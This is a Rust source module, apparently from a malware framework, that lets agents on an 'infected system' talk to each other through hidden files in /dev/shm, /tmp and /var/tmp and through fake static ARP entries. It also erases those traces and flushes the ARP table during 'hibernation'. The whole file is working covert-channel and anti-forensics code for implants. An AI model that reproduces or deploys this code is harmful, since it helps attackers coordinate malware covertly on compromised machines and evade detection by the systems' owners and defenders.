// Stigmergy: environment-based indirect communication.
// Agents leave "trails" in the infected system that other agents read.
// No direct IPC needed — communication happens through the environment.
//
// Channels:
//   Linux: /proc/sys/kernel/random/boot_id, /dev/shm/.hive_*, ARP cache
//   Windows: NTFS ADS (Alternate Data Streams), Registry keys, ARP cache

use std::io::Write;
use tracing::{info, warn};

/// Leave a pheromone trail in the environment for other agents to find.
/// Returns the trail location.
pub fn leave_trail(agent_id: &str, data: &str) -> String {
    let trail_paths = [
        format!("/dev/shm/.hive_{}", &agent_id[..8.min(agent_id.len())]),
        format!("/tmp/.hx_{}", &agent_id[..8.min(agent_id.len())]),
        format!("/var/tmp/.hs_{}", &agent_id[..8.min(agent_id.len())]),
    ];

    for path in &trail_paths {
        if let Ok(mut f) = std::fs::OpenOptions::new()
            .create(true).write(true).truncate(true).open(path)
        {
            let _ = f.write_all(data.as_bytes());
            let _ = f.sync_all();
            info!("STIGMERGY: trail left at {}", path);
            return path.clone();
        }
    }

    // Fallback: ARP cache stigmergy (leave fake MAC entries)
    leave_arp_trail(agent_id, data);
    String::new()
}

/// Read pheromone trails left by other agents.
pub fn read_trails() -> Vec<(String, String)> {
    let mut trails = Vec::new();
    for dir in &["/dev/shm", "/tmp", "/var/tmp"] {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.starts_with(".hive_") || name.starts_with(".hx_") || name.starts_with(".hs_") {
                    if let Ok(data) = std::fs::read_to_string(entry.path()) {
                        if data.len() < 10000 {
                            trails.push((entry.path().display().to_string(), data));
                        }
                    }
                }
            }
        }
    }
    trails
}

/// Leave a trail in the ARP cache (fake static entries).
fn leave_arp_trail(agent_id: &str, data: &str) {
    // Encode data as fake MAC addresses in static ARP entries
    let fake_ip = format!("10.{}.{}.{}",
        agent_id.as_bytes().get(0).unwrap_or(&0) % 254 + 1,
        agent_id.as_bytes().get(2).unwrap_or(&0) % 254 + 1,
        agent_id.as_bytes().get(4).unwrap_or(&0) % 254 + 1,
    );

    // Encode first 6 bytes of data as MAC
    let mac = data.as_bytes().iter().take(6)
        .map(|b| format!("{:02x}", b))
        .collect::<Vec<_>>()
        .join(":");

    let _ = std::process::Command::new("arp")
        .args(["-s", &fake_ip, &mac])
        .output();

    info!("STIGMERGY: ARP trail: {} -> {}", fake_ip, mac);
}

/// Clean all trails (called during hibernation).
pub fn clean_trails() {
    for dir in &["/dev/shm", "/tmp", "/var/tmp"] {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                if name.starts_with(".hive_") || name.starts_with(".hx_") || name.starts_with(".hs_") {
                    let _ = std::fs::remove_file(entry.path());
                }
            }
        }
    }
    let _ = std::process::Command::new("ip").args(["neigh", "flush", "all"]).output();
    info!("STIGMERGY: all trails cleaned");
}
